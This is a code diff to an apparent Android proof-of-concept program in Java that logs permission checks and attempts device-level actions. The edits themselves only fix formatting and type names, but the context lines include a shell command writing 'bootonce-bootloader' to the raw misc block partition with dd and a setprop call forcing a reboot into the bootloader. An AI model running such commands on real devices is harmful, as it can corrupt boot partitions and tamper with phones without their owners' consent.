@@ -20,6 +20,7 @@ public class Main {
 
     private static final String REPORT_PATH = "/cache/exploit_report.txt";
 
+    @SuppressWarnings("deprecation")
     public static void main(String[] args) {
         StringBuilder report = new StringBuilder();
         SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.getDefault());
@@ -83,9 +84,9 @@ public class Main {
                     try {
                         Method checkPerm = pm.getClass().getMethod("checkPermission", String.class, String.class, int.class);
                         int res = (int) checkPerm.invoke(pm, p, "com.poc", uid);
-                        report.append("checkPermission(").append(p).append(": ").append(res == 0 ? "GRANTED" : "DENIED (" + res + ")").append("\n");
+                        report.append("checkPermission(").append(p).append("): ").append(res == 0 ? "GRANTED" : "DENIED (" + res + ")").append("\n");
                     } catch (Exception e) {
-                        report.append("checkPermission(").append(p).append(": Error\n");
+                        report.append("checkPermission(").append(p).append("): Error\n");
                     }
                 }
             }
@@ -125,7 +126,7 @@ public class Main {
             // 7b. Try writing via dd command (if /system/bin/dd exists)
             report.append("Write misc via dd command: ");
             try {
-                Process p = Runtime.getRuntime().exec(
+                java.lang.Process p = Runtime.getRuntime().exec(
                     new String[]{"/system/bin/sh", "-c",
                         "echo -n 'bootonce-bootloader' | /system/bin/dd of=/dev/block/by-name/misc bs=1024 count=1 conv=notrunc 2>/dev/null"
                     }
@@ -150,7 +151,7 @@ public class Main {
             // 7d. Try to use setprop via command line
             report.append("setprop sys.powerctl reboot,bootloader: ");
             try {
-                Process p = Runtime.getRuntime().exec(
+                java.lang.Process p = Runtime.getRuntime().exec(
                     new String[]{"/system/bin/setprop", "sys.powerctl", "reboot,bootloader"}
                 );
                 int code = p.waitFor();
